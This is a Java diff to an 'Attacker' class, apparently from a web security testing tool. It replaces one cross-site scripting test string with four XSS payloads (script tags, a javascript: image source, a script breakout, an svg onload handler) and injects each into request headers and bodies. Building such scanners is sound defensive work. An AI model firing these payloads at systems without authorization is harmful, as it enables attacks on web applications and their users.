@@ -14,7 +14,7 @@ import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
 public class Attacker {
-    private String script = "<script>alert(1)</script>";
+    private List<String> scripts;
     private List<Rule> rules;
     private List<Rule> attackRules;
 
@@ -22,6 +22,11 @@ public class Attacker {
         this.attackRules = new ArrayList<>();
         this.rules = new ArrayList<>();
         this.rules.addAll(rules);
+        this.scripts = new ArrayList<>();
+        scripts.add("<script>alert('XSS')</script>");
+        scripts.add("<img src=javascript:alert('XSS')>");
+        scripts.add("</script><script>alert('XSS')</script>");
+        scripts.add("<svg onload=alert('XSS')>");
     }
 
     public void attack() {
@@ -32,8 +37,10 @@ public class Attacker {
 
     public void XSSAttacks() {
         XSSQueryParams();
-        XSSHeaders();
-        XSSBody();
+        for(String script: scripts) {
+            XSSHeaders(script);
+            XSSBody(script);
+        }
     }
 
     private void XSSQueryParams() {
@@ -68,7 +75,7 @@ public class Attacker {
         }
     }
 
-    private void XSSHeaders() {
+    private void XSSHeaders(String script) {
         Map<String, String> headersMap = new HashMap<>();
         for(Rule rule: rules) {
             if (rule instanceof InOutRule) {
@@ -83,7 +90,7 @@ public class Attacker {
         }
     }
 
-    private void XSSBody() {
+    private void XSSBody(String script) {
         for(Rule rule: rules) {
             if(rule instanceof InOutRule) {
                 continue;
